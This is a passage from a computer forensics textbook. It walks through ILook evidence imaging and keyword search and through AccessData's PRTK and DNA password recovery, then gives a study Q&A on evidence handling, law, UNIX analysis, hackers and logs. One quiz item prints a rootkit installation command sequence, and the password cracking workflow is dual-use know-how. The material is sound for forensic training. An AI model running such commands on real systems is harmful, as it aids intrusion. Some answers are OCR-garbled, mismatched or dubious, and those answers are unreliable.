| DBXL, ver. 1.3 || Framework, ver. 3.0 || RrBASE 5000, ver. through 3.1; R:BASE System V, ver. 1.0; Personal R-.BASE, ver. 1.0 ||   |

*Table 7.6* Presentation file formats supported.

  
|   |
| --- |
| Corel Presentations, ver. 8.0, 9.0, and 2002Novell Presentations, ver. 3.0 and 7.0Harvard Graphics for DOS, ver. 2.x and 3; Harvard Graphics, Windows ver.Freelance for Windows, ver. 1.0, 2.0, 96, 97, Millennium; Freelance for OS/2, ver. through 2.0Microsoft PowerPoint for Windows, ver. through 2002; Microsoft PowerPoint for Macintosh, ver. 4.0, 98 |

*Table 7.7* Compressed and encoded formats supported.

  
|   ||   |
| --- | --- |
| GZIP, no specific versionLZA Self Extracting Compress, no specific versionLZH Compress, no specific versionMicrosoft Binder, ver. 7.0, 97MIME (text mail), no specific version || UUEncode, no specific versionUNIX Compress, no specific versionUNIX TAR, no specific versionZIP PKWARE, ver. through 2.04g |

*Table 7.8* Desktop publishing and other miscellaneous formats supported.

  
|   ||   |
| --- | --- |
| Adobe FrameMaker (text only), ver. 6.0Executable (EXE, DLL), no specific versionExecutable for Windows NT, no specific versionMSG (text only): Microsoft Outlook Mail format || Microsoft Project (text only), Project 98vCard Electronic Business Card Versit, ver. 2.1WML, compatible with WML specification 5.2JustSystems Ichitaro, ver. 5.0, 6.0, 8.0, 9.0, and 10.0 |

The initial ILook screen looks like the one in [Figure 7.1](#c7.xhtml#f7.1) when you first start the program. To initially bring evidence into ILook, press F4 to open the Evidence Management Window (EMW) shown in [Figure 7.2](#c7.xhtml#f7.2). Notice in the top right of [Figure 7.2](#c7.xhtml#f7.2) an area entitled Evidence Definition File (EDF). Click the New button so that a new EVD file can be created. The EVD file will contain the case configuration information for this new case. Note that you would create a new EVD file for each case for which you are doing an investigation.

![Figure 7.1 Initial ILook screen.](images/fig7.1.jpg)

*Figure 7.1* Initial ILook screen.

![Figure 7.2 The Evidence Management Window.](images/fig7.2.jpg)

*Figure 7.2* The Evidence Management Window.

Once you click the New button, you are asked if you want to Save the log. Normally you would want to save the log, so click the Yes button. The next thing you are asked is where you want to save this log. Save it where you so desire, then click the Save button.

Next we move to the bottom right section, where we see the Investigator’s Name/ID area. Click the Change button and enter your name. Placing your name in this section allows your name to be attached to each new piece of evidence that is added to the case. If need be, you can change this for specific pieces of evidence that may be added to the case by other members of your team.

Directly above the Investigator’s Name/ID area is a section entitled Case Results Path. Here you select the drive that you will use to hold reports and any data that you choose to extract from the suspect’s hard drive.

Directly above the Case Results Path section is the Case Reference section. Click the Change button if you wish to change the case reference name. In this case, I’m going to keep the case reference name as PSTcasel. Click the OK button to continue. Based on the changes we have made, the Evidence Management Window (EMW) now looks as shown in [Figure 7.3](#c7.xhtml#f7.3).

![Figure 7.3 The Evidence Management Window after the case is created.](images/fig7.3.jpg)

*Figure 7.3* The Evidence Management Window after the case is created.

Now we need to add the actual evidence items to the case. You perform the following process for each evidence item you wish to add to the case.

Notice the yellow button labeled Add Evidence to Case. Click on this button to see a section entitled Evidence 1 with various subitems underneath it ([Figure 7.4](#c7.xhtml#f7.4)).

![Figure 7.4 New Evidence Management Window.](images/fig7.4.jpg)

*Figure 7.4* New Evidence Management Window.

Right-click on Evidence 1, then left-click on Edit Evidence ID. Enter “PST & JC Files” as shown in [Figure 7.5](#c7.xhtml#f7.5). Once you have entered the desired text that provides you with a descriptive name for your evidence, click the OK button.

![Figure 7.5 Evidence ID update screen.](images/fig7.5.jpg)

*Figure 7.5* Evidence ID update screen.

In the Evidence Info section, right-click Notes ([Figure 7.4](#c7.xhtml#f7.4)) and select the Edit function. Type in a description of the evidence as shown in [Figure 7.6](#c7.xhtml#f7.6), then click OK.

![Figure 7.6 Evidence notes updates screen.](images/fig7.6.jpg)

*Figure 7.6* Evidence notes updates screen.

There are various ways to have ILook import the Bruce.pst and JC files so that we can analyze them. In this case, let us use an EnCase image file. We will therefore need to make an EnCase image of the Bruce.pst and JC files so that we can read an EnCase image file into ILook. Start EnCase and the first window that opens is [Figure 6.1](#c6.xhtml#f6.1) (see [Chapter 6](#c6.xhtml#c6)). Click on Acquire to open the Create An Evidence File screen ([Figure 6.2](#c6.xhtml#f6.2)). Click Next, which opens the Choose a Drive screen ([Figure 6.3](#c6.xhtml#f6.3)). Choose E: because that is where the evidence files are; then click Next. Enter the data shown in [Figure 7.7](#c7.xhtml#f7.7); then click Next.

![Figure 7.7 Encase identification screen.](images/fig7.7.jpg)

*Figure 7.7* Encase identification screen.

On the next screen, Analysis Options, click Add and verify, then click Next. Fill in the blanks, then click Finish to create the evidence file. Notice that the file is not password protected, but in most cases it should be ([Figure 7.8](#c7.xhtml#f7.8)).

![Figure 7.8 EnCase output file screen.](images/fig7.8.jpg)

*Figure 7.8* EnCase output file screen.

It took EnCase 12 minutes and 27 seconds to create this evidence file and another 2 minutes and 27 seconds to verify it. This volume was a total of 4.2 GB in size containing files consisting of a total size of 62.3 MB. Now that we have an EnCase image file (JCJPST.E01), let us return to ILook and make use of this image. [Figure 7.9](#c7.xhtml#f7.9) shows the Evidence Management (EMW) screen.

![Figure 7.9 New ILook evidence management screen.](images/fig7.9.jpg)

*Figure 7.9* New ILook evidence management screen.

Now right-click on Image 0, then left-click on Select Image Section. This shows the files saved. Select JC\_PST.E01, then click the Open button.

Notice how ILook automatically picked up the other evidence files associated with JC\_PST.E01. Each of these files is 640 MB in length, and was made by EnCase in this size because we told it this was what we wanted (see earlier EnCase screenshot indicating File Segment Size).

Now click on the Apply button to save your changes. [Figure 7.10](#c7.xhtml#f7.10) shows an updated EMW screen.

![Figure 7.10 Updated EMW screen.](images/fig7.10.jpg)

*Figure 7.10* Updated EMW screen.

Right-click on the PST & JC Files entry in the EMW in [Figure 7.10](#c7.xhtml#f7.10), then left-click on Standard Partition Traverse on the menu. Click on a folder to view the files that are contained in it. To save the current ILook state, right-click on the yellow icon next to PST & JC Files, then left-click on Save Mapping Data. If you later exit ILook and wish to restore the file mapping you have saved, right-click on the yellow icon again, then left-click on Load Mapping Data. This will restore your session.

Now let us perform a text search on the files we have mapped. Click on the device, partition, folder, or files that you desire to search, then click on Search (F5) on the main menu bar at the top of the EMW, which opens the Data Search windows ([Figure 7.11](#c7.xhtml#f7.11)).

![Figure 7.11 Data search window.](images/fig7.11.jpg)

*Figure 7.11* Data search window.

Notice that ILook has three types of searches: Standard, Bulk, and Indexed. Let us take a quick look at each one.

The Standard Search Engine (SSE) allows you to search through case data that belongs to whatever Data Group you choose. (See [Figure 7.11](#c7.xhtml#f7.11) for these groups.) This is a raw text search through every byte of data in the Data Group. It can take a considerable amount of time to search through a large amount of data because this is such an exhaustive technique. The SSE is usually used when you just want to try three or four search terms to see whether you get a hit.

The Bulk Search Engine (BSE) allows you to simultaneously search for up to 500 ASCII keywords. This means the 500 keywords are searched for in approximately the same time frame that it took the SSE to do one word. The BSE can also be set up to not only search for the 500 ASCII keywords simultaneously but also search for their Unicode equivalents at the same time. This is a raw text search through every byte of data in the Data Group. It can take a considerable amount of time to search through a large amount of data because this is such an exhaustive technique. The results from the BSE can be displayed in multiple formats.

The Indexed Search Engine (ISE) enables you to search large quantities of data at a much higher rate. First you must develop an index database. Once the database is constructed, you then run your searches against the database instead of the raw text you used with the BSE and SSE. The best situation in which to use the ISE is when you plan to run a large number of various text searches over a rather lengthy period of time.

Because we have already developed a keyword search list (KeywordsBAEl.txt), let us use it again and make use of the BSE. First set up the Data Search windows as shown in [Figure 7.12](#c7.xhtml#f7.12).

![Figure 7.12 Starting a bulk search.](images/fig7.12.jpg)

*Figure 7.12* Starting a bulk search.

Notice that I chose the Report (. HTM) output format. Because this only requires that the user have a browser, the choice of this option is common. The Comma Separate Value (.CSV) output format can be read using Microsoft Excel and the Access Database (.MDB) output format can be read using Microsoft Access.

Now click on the Load button to open the Select your Bulk Search Term file window. Highlight the keyword search list (KeywordsBAEl.txt), then click Open to load the path and the filename into the Data Search window.

Now, click the Search button on the Data Search window ([Figure 7.12](#c7.xhtml#f7.12)) to initiate the search. When the ILook Tagged Search window opens, click OK.

Although the entire report is too lengthy to show, a portion of the first HTML (Hypertext Markup Language) screen looks like the one in [Figure 7.13.](#c7.xhtml#f7.13)

![Figure 7.13 ILook’s bulk search report screen.](images/fig7.13.jpg)

*Figure 7.13* ILook’s bulk search report screen.

This concludes our look at ILook. As a final item, note that in your searches you can use characters such as “?” (in place of any single character), “#” (in place of any numeric character), and (in place of any characters in the specified position). Any search term that consists of more than one word must be enclosed in single quotes.

## Chapter questions

*   1\. What Hash databases does ILook Investigator support?
*   2\. Who is the author of ILook?
*   3\. What prominent U.S. government agency makes significant use of ILook Investigator?
*   4\. Does ILook Investigator make extensive use of color coding to enhance investigative efficiency?

# Chapter 8 Password recovery

DOI: [10.1201/9781003134817-8](https://doi.org/10.1201/9781003134817-8)

There are a variety of tools for password recovery which you can find in Kali Linux and elsewhere. Here I will mention Password Recovery Toolkit (PRTK) from AccessData of Provo, Utah ([http://www.AccessData.com](http://www.accessdata.com)). AccessData has been doing password recovery since 1987. PRTK is used by law enforcement organizations and corporations. The product is updated quarterly. Read the manual (.pdf format) and the ReadMe file that comes with PRTK. To install, insert the CD-ROM and follow the prompts.

When starting the product, you will see the password request. Insert the license diskette into the diskette drive. Type in the default password given with the product (123 is typical). See the Simple Start wizard and its four selections. Choose Go directly to the program and begin working.

First click on Edit, Change Password, and eliminate the default password that comes with the product. Put in your new secure password (pass phrase is best) and then click on OK. Now the license disk has a new password. You must remember the new password. The license disk only has to be used the first time you launch the program. Once the program is running, remove the license disk for the rest of the session. However, each time you start up the program, you must have the license diskette in the diskette drive.

Click on the icon Select Drives/Folders (picture of a hard drive), select the drive(s) you are interested in, and click on OK. The adding files will begin. Click on the red Stop icon if you obtain enough files and want to work with just those. You can also select individual files or folders using this icon.

Use copy/paste to move the shown files into Excel if you wish. You can also use Microsoft Explorer by shrinking the PRTK window and dragging and dropping files into the PRTK window from Microsoft Explorer. Fill out the dialog box that pops up when you do this. Now maximize the PRTK screen again and click on the icon just to the right of the printer icon (Select Folders icon). This allows you to add additional files on a one-by-one basis (multiple files can also be added).

A filter will now be used that allows us to obtain only the password-protected files. Click on the Single File/Folder icon. In the dialog box that pops up, go down and click on password-protected files, select the files/folders you want PRTK to check, and then press the Add button. Now password-protected files show up on the PRTK screen.

PRTK can show whether a file extension (Registered Type column) is telling the truth about the file type that the file actually is (Identified Type column). A difference between the two columns is a quick indication that the two columns do not match (they normally would). This is indicative of someone seeking to hide information from you by giving the filename an extension that disguises what is actually in the file.

File hashing verification can be done by PRTK, allowing you to discover whether a file is what it says it is. It can be used to show whether or not a file or files were changed in some manner at some time.

For password recovery, there are three levels: easy, medium, and hard. Passwords can be recovered easily (usually the password is broken within minutes) from:

 
| Lotus 123 || Organizer |
| --- | --- |
| Access || Outlook |
| ACT || ProWrite |
| Approach || QuatroPro |
| Ascend || QuickBooks |
| dBase || Quicken |
| Excel || Word |
| Money || WordPro |

Passwords can be recovered with medium difficulty (hours to one or two days) from:

*   Paradox
*   WordPerfect

And it is most difficult to recover passwords from:

*   Ami Pro
*   Excel ‘97 and 2000 PGP
*   PGPDisk
*   PKZip
*   Word 97 and 2000

You can also provide your own customized dictionaries for PRTK. This would be on a case-by-case basis as you learn more about victims/attackers involved with a case. PRTK remembers all the passwords it has recovered in the past. To input biographical data:

1.  Click on the Person icon (Biographical Information).
2.  Click on New and give the bio dictionary a name.
3.  Under descriptions and information, put in the appropriate information in the dialog box and click on the button to the right (Insert).
4.  Click on OK. Now a large word list is created.
5.  Click on the icon of the person with books.
6.  Click on New and type in the profile name. (A profile is a list of dictionaries.)
7.  Select the dictionaries you want in the profile and click on OK.
8.  Select Drives/Folder icon (click on it).
9.  Select some files.
10.  Select the profile you want.
11.  Click on OK.
12.  Open the Recovery Properties dialog box and begin recovery.

The Open File button allows access to the password-protected file once recovery is completed. When the password request button comes up, use Ctrl-V to paste in the recovered password.

**Note**: The four bottom buttons on the right are:

*   Start Recovery
*   Pause/Resume Recovery
*   Skip Recovery Level (not recommended for normal use; use for power failure)
*   Stop Recovery

We will now go through the complete process. First, learn as much as you can about the perpetrators. Look at their pictures, books, rooms, etc. Second, determine the purpose of the file you are trying to get into. Now go into PRTK.

1.  Open the Setup Profiles dialog box. Be sure the profiles information is set up properly (depends on the perpetrator’s biography and the case). Click on OK.
2.  Now click on the Biographical Information icon (person). Be sure you have everything there you need. Click on OK.
3.  Now click on the Select Drives/Folders icon and select the case folder that contains the files that need the password to be broken. Organization is important. Now click on OK.

Password recovery begins immediately, as shown on your screen.

As the recovery moves along, other files can be dragged onto the recovery screen. PRTK will begin working on each file (once you click on OK on the dialog box that pops up during the drag) when its turn in the queue arrives. (Force work to begin immediately on a file by selecting the file on the PRTK screen, right clicking, and pressing the Start Recovery button.)

What if PRTK says it could not obtain the password? Then go to the product called Distributed Network Attack (DNA). DNA is a client/server product and harnesses the processing power from multiple machines to break the password. The machines must have an IP address connected to the Internet. DNA uses unused processor cycles. The user of the other machines does not notice that these cycles are being used. One machine is set up as the DNA Manager. It polls the clients and divides up the workload.

## Chapter questions

*   1\. Who makes excellent password recovery tools?
*   2\. What individual Password Breaker Modules does AccessData have available?
*   3\. Does AccessData have utilities that will bypass network administrator passwords?
*   4\. What can you do if the Password Recovery Toolkit says it cannot obtain a password you desire?

# Chapter 9 Questions and answers by subject area

DOI: [10.1201/9781003134817-9](https://doi.org/10.1201/9781003134817-9)

## Evidence collection

*   **Q: When evidence is processed in the lab, do we work on the evidence or on a copy of the evidence?**
*   **A:** Only on a copy of the evidence.
*   **Q: Before booting a computer with a diskette, what critical item should be checked?**
*   **A:** CMOS settings to ensure the diskette boots first. If you boot from the hard drive, you will corrupt or lose evidence. And yes, some areas of the world are still using diskettes so I’m keeping such items in this newer version of the book.
*   **Q: Who should be the first person sitting with you at the victim’s machine?**
*   **A:** A system administrator who is an expert on that system type.
*   **Q: What do you want to obtain from a dot matrix or impact printer?**
*   **A:** Ribbon.
*   **Q: What should computer and magnetic media be kept away from?**
*   **A:** Magnetic fields.
*   **Q: What tool can you use to prove a file was not altered?**
*   **A:** CRCMD5 from NTI (New Technologies, Inc.).
*   **Q: If your assistant encrypts a file, is it done with a public key or private key?**
*   **A:** Public. You then decrypt it with your private key.
*   **Q: What command do you type to format a DOS diskette so it is bootable?**
*   **A:** format a:/s
*   **Q: You want to protect the backup files you just made using SafeBack. What software tool should you use?**
*   **A:** CRCMD5 from NTI.
*   **Q: What computer forensics tool is used to obtain slack space data?**
*   **A:** GetSlack from NTI.
*   **Q: Why should you** *not* **turn off the modem?**
*   **A:** It may contain the last number dialed. It may contain a list of numbers.
*   **Q: Do you want an orderly shutdown of the computer? Why or why not?**
*   **A:** No. Valuable data could be lost during an orderly shutdown.
*   **Q: How do you perform a disorderly shutdown of a computer?**
*   **A:** Disconnect the plug on the back of the computer. Do not use the off switch.
*   **Q: How large must the destination drive be when using SafeBack?**
*   **A:** At least as large as the source disk.
*   **Q: Should you load and run evidence collection and analysis tools from the hard drive that contains the evidence you are collecting?**
*   **A:** No. Always load and run your tools from another medium, such as a diskette, Jaz Drive, Zip disk, or CD-ROM.
*   **Q: Name other network devices you can collect evidence from besides standard computer systems.**
*   **A:** Firewalls, routers, switches, and e-mail servers.
*   **Q: What software tool can you use in court to prove that your copy of the file is valid?**
*   **A:** CRCMD5 from NTI.
*   **Q: What tool would be used to collect a bitstream backup of a hard drive?**
*   **A:** SafeBack from NTI.
*   **Q: When using SafeBack, one of the options is local and the other is lptl. Explain each of these options.**
*   **A:** Local = Zip Drive or other collection devices you have connected directly to the back of the computer that contains the evidence. lptl = moving data from the victim computer to another computer.
*   **Q: What does the program ResPart.exe from NTI do?**
*   **A:** Restores partition table data when it is destroyed.
*   **Q: To start SafeBack, what filename do you type from the diskette?**
*   **A:** Master.
*   **Q: When using the backup selection on SafeBack, are you making a bitstream backup?**
*   **A:** Yes.
*   **Q: What does the restore function do in SafeBack?**
*   **A:** Restores the bitstream image to the destination drive.
*   **Q: You have used SafeBack to make your bitstream backup. What should be the next option you use in SafeBack?**
*   **A:** Use the “verify” option to ensure that the backup you just made can be properly accessed and read.
*   **Q: If I tell SafeBack to attempt Direct Access, what is the purpose of this and what will it do?**
*   **A:** Bypass BIOS and go directly to the drive controller.
*   **Q: In SafeBack, what do numbered drives represent?**
*   **A:** Physical drives.
*   **Q: In SafeBack, what do lettered drives represent?**
*   **A:** Logical volumes.
*   **Q: What does the phrase “secure the crime scene” mean?**
*   **A:** Keep people away from the area containing the compromised systems. Do not let the victim machines be touched.
*   **Q: What is the Federal Bureau of Investigation’s (FBI’s) definition of a computer crime?**
*   **A:** The computer must be the victim.
*   **Q: What is a CyberTrail?**
*   **A:** Digital logs, stored files, web pages, e-mail, digitized images, and digitized audio and video.
*   **Q: When you arrive at a scene, how do you secure the logs and any information you capture to logs from the time you arrived?**
*   **A:** Spool logs off to a log host machine. No trust relationship.
*   **Q: A ribbon cable has two connectors. What do they connect to?**
*   **A:** Primary hard drive and primary slave.
*   **Q: What does it tell you if AutoAnswer is lit up on the modem?**
*   **A:** The modem is configured to receive incoming calls.
*   **Q: What do flashing lights on a modem indicate?**
*   **A:** The modem is in use.

## Legal

*   **Q: Define exculpatory evidence.**
*   **A:** Evidence that contradicts your findings or hypothesis.
*   **Q: What is case law?**
*   **A:** How judges and juries have interpreted the law as it is written in the statutes.
*   **Q: What is the purpose of the exclusionary rule?**
*   **A:** To eliminate evidence that was improperly or illegally collected.
*   **Q: In a court of law, what are protective orders?**
*   **A:** Evidence that may contain a trade secret which, if revealed, may do more harm than good.
*   **Q: Treat everything done in an investigation as if it will end up in \_\_\_\_\_\_\_\_\_\_.**
*   **A:** Court.
*   **Q: What are three courtroom necessities that you must be sure to follow?**
*   **A:** Preservation of evidence, chain of custody, and adhering to the rule of evidence.
*   **Q: What does the phrase “tainted fruit” mean?**
*   **A:** If you did not have legal access to the computer, any evidence you collected cannot be used.
*   **Q: With whom should you confer if you are not sure about the legality of an action you are about to take?**
*   **A:** An attorney familiar with computer crime laws.
*   **Q: Give an example of “admissible writing” from a computer standpoint.**
*   **A:** Hard drive.
*   **Q: What is the common method for authenticating evidence in court?**
*   **A:** Show the item’s identity through some distinctive characteristic or quality.
*   **Q: What three things must you do so that a digital photograph can be admissible in court?**
*   **A:** Print it, sign it, and date it.
*   **Q: If you generate a hypothesis, what must you bring to court for the opposition?**
*   **A:** Your step-by-step procedure, so they can reproduce your results.
*   **Q: Per Department of Justice (DOJ) search and seizure guidelines, when is computer hardware or software considered to be instrumental?**
*   **A:** When it has played a significant role in a crime.
*   **Q: Per DOJ search and seizure guidelines, give an example of contraband information on a computer system.**
*   **A:** Illegal encryption software.
*   **Q: Per DOJ Search and Seizure Guidelines, give an example of information as fruits of a crime.**
*   **A:** Illegal copies of computer software; stolen trade secrets and passwords.
*   **Q: If I want to do a trap and trace over the network, what must be obtained if law enforcement is involved?**
*   **A:** A warrant.
*   **Q: What are the current laws used to prosecute computer crimes in the United States at the federal level?**
*   **A:** Under Title 18 USC: 
    *   Paragraph 1029: Unauthorized use of access devices
    *   Paragraph 1030: Unauthorized access to computer
    *   Paragraph 1831: Theft of trade secrets by a foreign agent
    *   Paragraph 1832: Theft of trade secrets
    *   Paragraph 2319: Copyright infringement
    *   Paragraph 2320: Trademark infringement
    *   Paragraph 2511: Unauthorized interception of wire communication
    *   **Note:** Paragraphs 1029 and 1030 are used most for:
    *   Computer hacking
    *   Telephone phreaking
    *   Computer intrusions
    *   Theft of passwords
    *   Intentional destruction of data
*   **Q: What is the ECPA and to whom does it apply?**
*   **A:** Electronic Communications Privacy Act. It applies to everyone.

## Evidence analysis

*   **Q: Do I use the NTI FileList program before or after using SB?**
*   **A:** After.
*   **Q: Must FileList be on a DOS-bootable diskette?**
*   **A:** Yes.
*   **Q: What program must I use to read the output from FileList?**
*   **A:** FileCnvt.exe from NTI.
*   **Q: Name three hidden areas on a hard drive that could contain data.**
*   **A:** Slack Space, unallocated space, and web browser cache.
*   **Q: Name two file types to look at immediately.**
*   **A:** Configuration and Startup files.
*   **Q: What are the two main DOS startup files?**
*   **A:** CONFIG.SYS and AUTOEXEC.BAT.
*   **Q: What three items do we try to apply to a suspect?**
*   **A: <=** 4.0 DOS.
*   **Q: What three items do we try to apply to a suspect?**
*   **A:** Motive = why; means = how; opportunity = when.
*   **Q: A file is never deleted until \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_.**
*   **A:** It is overwritten.
*   **Q: What is it called when a large file is spread over several sectors?**
*   **A:** Fragmentation.
*   **Q: What are the four main areas of a hard drive?**
*   **A:** Track, sector, cylinder, and cluster.
*   **Q: What is slack space?**
*   **A:** Space that a file does not use up inside a cluster.
*   **Q: What is unallocated space?**
*   **A:** The space taken up by a file when you erase it.
*   **Q: What are the two types of windows swap files?**
*   **A:** Temporary and permanent.
*   **Q: What tool do you use to look at the web browser cache?**
*   **A:** unmozify.
*   **Q: Use \_\_\_\_\_\_\_\_\_\_\_\_ to search for keywords in hidden areas of the disk.**
*   **A:** TextSearch.
*   **Q: What is chaining?**
*   **A:** Following fragmented files from sector to sector to reconstruct the file.
*   **Q: Can SUN UNIX disks be read in an Intel-based computer?**
*   **A:** Yes.
*   **Q: Fifteen items can be used in software forensics to determine who wrote the code. Name three of them.**
*   **A:** Data structures, algorithms, compiler used, expertise level, system calls made, errors made, language selected, formatting methods, comment styles, variable names, spelling and grammar, language features used, execution paths, bugs, comments.
*   **Q: Try to narrow the field of \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_ before using SFA.**
*   **A.** Potential suspects.
*   **Q: Name a major system log limitation.**
*   **A:** Easy to modify anonymously without being noticed; easy to tamper with.
*   **Q: Can you depend upon the evidence from one log? Why or why not?**
*   **A:** No. Other corroborating evidence is needed.
*   **Q: I have run SafeBack, FileList, and FileCnvt. Now I must run Filter\_I. What will it do?**
*   **A:** It is an intelligent filter that removes binary data and any ASCII data that is not a word.
*   **Q: Must FilterJ and FileList be run in the same directory that contains the bitstream backup?**
*   **A:** Yes.
*   **Q: If the disk is highly fragmented, should GetSlack and GetFree be used or is it better to use some other program?**
*   **A:** Yes, use GetSlack and GetFree.
*   **Q: Are TextSearch Plus search strings case sensitive?**
*   **A:** No.
*   **Q: Which tool in Norton Utilities is primarily used to rebuild fragmented files?**
*   **A:** Disk Editor.
*   **Q: What are the two choices of tools for creating a working copy of a diskette?**
*   **A:** DOS DiskCopy (best) and AnaDisk.
*   **Q: What are three methods for hiding data on a diskette?**
*   **A:** Disks within disks; write data between tracks; and hide data in graphics.
*   **Q: You decide that you want to look at the Web browser cache. What tool would you use?**
*   **A:** unmozify.
*   **Q: What command do you use in UNIX to write RAM to disk, shut down the machine, and restart it?**
*   **A:** Shutdown-r.
*   **Q: What UNIX command can be used to reboot the machine and cause it to come up in single user mode?**
*   **A:** Halt-q.
*   **Q: You have the UNIX box in single user mode. You have the settings so that it will boot from the compact disk (CD). What command should you now type to cause the UNIX box to boot from the CD?**
*   **A:** Boot.
*   **Q: Which log saves commands that were typed on the system (in UNIX)?**
*   **A:** HISTORY.
*   **Q: What files in UNIX keep track of login and logout times?**
*   **A:** WTMP and BTMP.
*   **Q: What ten items should be logged as a minimum?**
*   **A:** Logins, logouts, privilege changes, account creation, file deletion, su access, failed logins, unused accounts, reboots, and remote access.
*   **Q: Name two versions of UNIX that normally run on an Intel platform.**
*   **A:** BSD and LINUX.
*   **Q: If you put a UNIX disk in an Intel platform and it will not boot, what should your next step be to make the boot happen?**
*   **A:** Use a “bare bones” version of the same UNIX version on another disk and boot from this disk. Be sure to set this boot disk as the Primary Master Hard Drive (PMHD).
*   **Q: DOS uses autoexec.bat and config.sys. What are the similar type startup files in UNIX?**
*   **A:** rc files.
*   **Q: To what UNIX files do hackers like to add booby traps?**
*   **A:** rc files.
*   **Q: You have rebooted the UNIX box to single user mode. What are the first files you should look at?**
*   **A:** rc files.
*   **Q: What is the name of the rootkit for Linux?**
*   **A:** Knark.
*   **Q: What UNIX file will save the memory contents if the system crashes?**
*   **A:** Core file.
*   **Q: Name two things that lastlog will show you.**
*   **A:** Who was on the system and key words such as “crash.”
*   **Q: What are the four major UNIX commands to use when analyzing crash dump files?**
*   **A:** Ps, netstat, nfsstat, and arp.
*   **Q: What type of machine should you use if you are doing crash dump analysis?**
*   **A:** Same o/s version.
*   **Q: For RedHat Linux, what is the command to verify the integrity of all important system files?**
*   **A:** rpm–VA.
*   **Q: The results of your last command indicate that a user named Bragger23 logged in earlier in the day and is currently logged into Solaris5. You want to see all the processes in memory that Bragger23 is running. What do you type?**
*   **A:** ps-aux | grep Bragger23.
*   **Q: What steps do you follow to remove Bragger23 and collect RAM evidence?**
*   **A:** To remove Bragger23 from the system, remove all of this user’s processes: 
    
    *   kill -9 1365
    *   kill -9 3287
    *   kill -9 1087
    *   kill -9 3001
    
      
    To collect RAM evidence. 
    *   ps–aux > a:\\Solaris5RAMproc.txt

## Military

*   **Q: Which is the highest (most critical) Department of Defense? Infocon level: Delta, Charlie, Bravo, or Alpha?**
*   **A:** Delta.

*   **Q: Name the three categories used by DOD for InfoSec incidents. Describe each.**
*   **A:** 
    *   Cat 3: Incident does not pose a major threat to the enterprise.
    *   Cat 2: Incident compromises a core system (financial, operational, marketing, or engineering).
    *   Cat 1: Incident poses a major global threat to the enterprise.

## Hackers

*   **Q: How do crackers usually get caught?**
*   **A:** Vanity, bragging, behavior patterns, sharing information, and tool signatures.
*   **Q: Explain the TCP (Transmission Control Protocol) three-way handshake.**
*   **A:** Syn. Syn/Ack. Ack.
*   **Q: What is a SynFlood and what does Fin do?**
*   **A:** SynFlood will mute a system by flooding it with syn packets. Fin will tear down a connection.
*   **Q: What is an exploit?**
*   **A:** A program written to break into computer systems.
*   **Q: To hijack a computer system, does a hacker want to complete the three-way handshake?**
*   **A:** No.
*   **Q: What are crafted packets?**
*   **A:** Packets maliciously constructed to damage a computer system.
*   **Q: What software program can be used to detect reconnaissance probes to a network?**
*   **A:** TCPdump.
*   **Q: What procedure should you follow to remove hacker software (four steps)?**
*   **A:** 
    1.  Kill process
    2.  Delete in registry
    3.  Delete file
    4.  Reboot
*   **Q: Failing computers can act as though they are being \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_.**
*   **A:** Attacked.
*   **Q: If you suspect a DoS (Denial of Service) attack, what three things should you look for?**
*   **A:** File deletions, file corruption, and hacker tools.
*   **Q: What are the five steps you should follow on a client’s system to recover from a malicious rootkit installation and usage?**
*   **A:** 
    1.  Client should back up their data (potentially corrupted).
    2.  You should format the hard drive(s).
    3.  You should reinstall the operating system from a trusted source.
    4.  Every password for the system should be changed (as should those for any other system the user may be on).
    5.  You should run a password cracker on the changed passwords to ensure they are strong passwords.
*   **Q: In one sentence, what is being done here (in general)?** 
    *   mkdir.HiddenHackFiles
    *   mv rootkit.tar.gz.HiddenHackFiles
    *   cd.HiddenHackFiles
    *   tar -zvf rootkit.tar.gz
    *   Is
    *   cd rootkit
    *   ./install
    *   exit
*   **A:** A rootkit is being installed.
*   **Q: When there is very little information to work with, what can you do on an Internet Relay Chat (IRC) line to draw the perpetrator out?**
*   **A:** Brag about how you are the one who pilfered the system(s).
*   **Q: When determining keywords, keep in mind that hackers’ words can look different than normal yet words yet have the same meaning. For example, how could a hacker write the later I? An E?**
*   **A:** Pipe symbol 3.

## BackTracing (TraceBack)

*   **Q: If the attacker is still online, what is one of the first commands you should use on a UNIX system to seek to trace the attacker?**
*   **A:** Finger.
*   **Q: To back trace someone from log data you have, what approach should you use?**
*   **A:** Go one hop back, talk to the system administrator there, get the administrator’s log data, etc.
*   **Q: You notice from logs that the hacker uses certain commands. What software should you put on these commands if you want to deny him access to them or if you want to allow him access to them, but trace his use of them.**
*   **A:** TCP wrappers.
*   **Q: To be successful at back tracing, you need three items. What are they?**
*   **A:** 
    1.  Very precise time of attack
    2.  Machines from which the attack occurred
    3.  Victim Internet Protocol (IP) address
*   **Q: What type of tool should you load on a network if you want to try to catch the hacker coming back for a repeat performance?**
*   **A:** A sniffer.
*   **Q: What are two types of sniffers?**
*   **A:** Network-based and host-based.
*   **Q: Name a type of sniffer and the company that makes it.**
*   **A:** ISS RealSecure (Axent ITA).
*   **Q: Is RealSecure a network-based or host-based sniffer?**
*   **A:** Network-based and host-based both.
*   **Q: Name a host-based sniffer.**
*   **A:** Axent ITA (RealSecure).
*   **Q: What is a honeypot?**
*   **A:** A system with a lot of false but highly interesting data. Use one to keep a hacker on box for a trace.

## Logs

*   **Q: To be useful logs should show three items. What are they?**
*   **A:** When the event occurred, the source of the event, and the nature of the event.
*   **Q: Why do most sites not use extensive logging?**
*   **A:** It adversely affects network performance and the storage capacity of drives.
*   **Q: What is the single biggest barrier to a successful investigation?**
*   **A:** No logs.
*   **Q: If the logs rolled over before they could be collected, what should be done?**
*   **A:** Try to extract them from a temp file; look on hidden areas of the disk.
*   **Q: What should be the next step if logs were never collected by the system administrator?**
*   **A:** Perform a detailed forensic examination of the disk (obtain passwords, user IDs, etc.).
*   **Q: Why would multiple log analysis be done? What is the objective?**
*   **A:** Provide corroboration, find discrepancies between logs.
*   **Q: What makes the su log very useful?**
*   **A:** It logs account changes by an online user.
*   **Q: When performing MLA, would you want to merge the separate logs into one log? Why?**
*   **A:** Yes. It makes it easier to analyze the data.
*   **Q: To search ASCII logs, what search tool should I use?**
*   **A:** TextSearch Plus from NTI, or EnCase from Guidance Software.
*   **Q: What are four tools that could be used to parse large logs?**
*   **A:** 
    1.  TextSearch Plus from NTI for ASCII logs.
    2.  AS AX for Unix (freeware).
    3.  ACL for DOS/Windows.
    4.  EnCase from Guidance Software.
